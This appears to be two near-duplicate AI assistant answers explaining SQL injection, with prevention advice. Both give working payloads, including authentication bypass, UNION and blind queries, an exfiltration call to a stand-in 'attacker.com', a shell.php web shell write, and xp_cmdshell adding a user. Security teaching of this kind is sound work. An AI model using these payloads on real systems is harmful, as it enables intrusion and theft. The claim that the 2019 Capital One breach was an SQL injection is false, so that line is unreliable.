Alright Ali — let’s go **deep** into **SQL Injection (SQLi)** so you understand it from the absolute basics to advanced exploitation and defense. This will be a **full-spectrum guide** — concepts, types, examples, attack chains, and prevention.

---

## 📌 1. What is SQL Injection?

**SQL Injection** is a vulnerability that allows an attacker to **interfere with the queries** an application makes to its database.

- It happens when **untrusted user input** is concatenated directly into an SQL query without proper validation or parameterization.
- The attacker can **inject malicious SQL code** to:
  - Read sensitive data
  - Modify or delete data
  - Execute administrative operations
  - Sometimes even execute commands on the underlying OS

It’s one of the **OWASP Top 10** most critical web application security risks.

## 🛠 2. How SQL Injection Works

Imagine a login form:

```sql
SELECT * FROM users WHERE username = 'ali' AND password = '1234';
```

If the application builds this query like:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

An attacker could enter:

```
Username: ' OR '1'='1
Password: anything
```

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```

`'1'='1'` is always true → returns all users → bypasses authentication.

## 🔍 3. Types of SQL Injection

### **A. In-Band SQLi** (most common)

Uses the same channel for injection and data retrieval.

- **Error-Based SQLi** : Forces the database to produce error messages revealing structure.
- **Union-Based SQLi** : Uses `UNION SELECT` to combine results from different queries.

Example:

```sql
' UNION SELECT username, password FROM users--
```

---

### **B. Blind SQLi**

No direct output — attacker infers data from application behavior.

- **Boolean-Based** : Changes in page content indicate true/false.

```sql
  ' AND 1=1--
  ' AND 1=2--
```

- **Time-Based** : Uses delays to confirm conditions.

```sql
  ' OR IF(1=1, SLEEP(5), 0)--
```

---

### **C. Out-of-Band SQLi**

Uses a different channel (HTTP/DNS) to exfiltrate data.

- Example:

```sql
'; EXEC xp_dirtree '\\attacker.com\share'--
```

→ Causes the DB to make a network request to attacker-controlled server.

---

## 🧪 4. Real-World Example

**2019 Capital One Breach** — misconfigured web app allowed SQLi → attacker accessed personal data of over 100 million customers.

---

## 🎯 5. Attack Chain

1. **Find input** that interacts with the database (URL params, forms, headers).
2. **Test for injection** with `'` or `"` to cause syntax errors.
3. **Identify DB type** (MySQL, MSSQL, Oracle, PostgreSQL).
4. **Extract data** using:
   - `UNION SELECT`
   - Error messages
   - Blind inference
5. **Escalate** — read/write files, execute OS commands (if DB supports it).

---

## 🛡 6. Prevention

### **Best Practices**

- **Parameterized Queries / Prepared Statements**

  Example in PHP (PDO):

  ```php
  $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
  $stmt->execute([$username, $password]);
  ```

- **Stored Procedures** (with care)
- **Input Validation** — allowlists for expected formats.
- **Least Privilege** — DB user should have minimal rights.
- **Error Handling** — show generic errors, log details internally.
- **Web Application Firewall (WAF)** — detect/block known patterns.

---

## 🏆 7. Advanced Exploitation Techniques

- **Second-Order SQLi** : Malicious input stored in DB and executed later in a different query.
- **Stacked Queries** : Multiple queries in one request (if DB supports `;`).
- **Bypassing Filters** :
- Using comments: `admin'--`
- Case changes: `UnIoN SeLeCt`
- Encoding: `%27` for `'`
- **Privilege Escalation** : Using SQLi to create new DB users with admin rights.
- **File Read/Write** : MySQL `LOAD_FILE()` or `SELECT ... INTO OUTFILE`.

💡 **In short:**

SQL Injection is like slipping extra instructions into a waiter’s order to the kitchen — if the waiter doesn’t check, you can get anything you want from the kitchen, not just what’s on the menu. In security terms, it’s one of the most powerful and dangerous vulnerabilities because it can lead to **full database compromise** and often **full system compromise** .

Alright Ali — let’s go **all‑in** and break down **SQL Injection (SQLi)** from the absolute fundamentals to advanced exploitation, chaining, and defense.

This will be a **complete, structured deep dive** so you can see the whole picture — from how it works, to every type, to how attackers weaponize it, to how defenders stop it.

---

## 1️⃣ What is SQL Injection?

**SQL Injection** is when an attacker manipulates an application’s SQL queries by injecting malicious input into parameters that are sent to a database.

- It happens when **user input is directly concatenated** into an SQL statement without proper validation or parameterization.
- This lets the attacker **alter the query’s logic** — reading, modifying, or deleting data, and sometimes even executing OS‑level commands.

💡 **Why it’s dangerous:** SQLi can lead to **full database compromise** and often **full system compromise** .

---

## 2️⃣ How SQL Injection Works

Imagine a login form:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

If the attacker enters:

```
Username: ' OR '1'='1
Password: anything
```

The query becomes:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```

`'1'='1'` is always true → returns all rows → bypasses authentication.

---

## 3️⃣ Types of SQL Injection

### **A. In‑Band SQLi** (same channel for injection & data retrieval)

- **Error‑Based SQLi** : Uses database error messages to extract data.

```sql
  ' AND EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--
```

- **Union‑Based SQLi** : Uses `UNION SELECT` to combine results from different queries.

```sql
  ' UNION SELECT username, password FROM users--
```

---

### **B. Blind SQLi** (no direct output — infer from behavior)

- **Boolean‑Based** : True/false conditions change the page.

```sql
  ' AND 1=1--
  ' AND 1=2--
```

- **Time‑Based** : Delays response to confirm conditions.

```sql
  ' OR IF(1=1, SLEEP(5), 0)--
```

---

### **C. Out‑of‑Band (OOB) SQLi**

- Uses a different channel (DNS, HTTP) to exfiltrate data.
- Example (MSSQL):
  ```sql
  '; exec master..xp_dirtree '\\attacker.com\share'--
  ```

---

### **D. Advanced Variants**

- **Second‑Order SQLi** : Malicious input stored in DB, executed later in a different query.
- **Stacked Queries** : Multiple queries in one request (if DB supports `;`).
- **NoSQL Injection** : Similar concept in NoSQL databases (MongoDB, etc.).

---

## 4️⃣ Attack Chain

1. **Discovery** — Find input that interacts with the DB (forms, URL params, headers).
2. **Testing** — Inject `'` or `"` to cause syntax errors.
3. **Fingerprinting** — Identify DB type (MySQL, MSSQL, Oracle, PostgreSQL).
4. **Enumeration** — Extract schema info (`information_schema.tables`).
5. **Data Extraction** — Dump sensitive data.
6. **Privilege Escalation** — Create new DB users, read/write files, execute OS commands.

## 6️⃣ Advanced Exploitation

- **Bypassing Filters** :
- Comments: `admin'--`
- Case changes: `UnIoN SeLeCt`
- Encoding: `%27` for `'`
- **Privilege Escalation** :
- MySQL: `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`
- MSSQL: `xp_cmdshell 'net user hacker pass /add'`
- **File Read/Write** :
- MySQL: `LOAD_FILE('/etc/passwd')`
- **OS Command Execution** :
- MSSQL: `xp_cmdshell`
- PostgreSQL: `COPY ... FROM PROGRAM 'command'`

## 7️⃣ Prevention

### **Best Practices**

- **Parameterized Queries / Prepared Statements** :

```php
  $stmt = $pdo->prepare('SELECT * FROM users WHERE username = ? AND password = ?');
  $stmt->execute([$username, $password]);
```

- **Stored Procedures** (with care).
- **Input Validation** — allowlists for expected formats.
- **Least Privilege** — DB user should have minimal rights.
- **Error Handling** — generic messages to users, detailed logs internally.
- **WAF/IDS** — detect/block known SQLi patterns.

---

## 8️⃣ Detection

- **Manual Testing** — Inject payloads and observe behavior.
- **Automated Scanners** — sqlmap, Burp Suite, OWASP ZAP.
- **Log Analysis** — Look for suspicious query patterns.
- **Database Monitoring** — Detect unusual queries.

---

## 9️⃣ Real‑World Impact

- **Authentication bypass**
- **Data theft**
- **Data destruction**
- **Full system compromise**
- **Regulatory fines** (GDPR, HIPAA)

💡 **In short:**

SQL Injection is like slipping extra instructions into a waiter’s order to the kitchen — if the waiter doesn’t check, you can get anything you want from the kitchen, not just what’s on the menu.

From a pentester’s perspective, it’s one of the most powerful vulnerabilities because it can be chained into **RCE** , **data exfiltration** , and **full network compromise** .
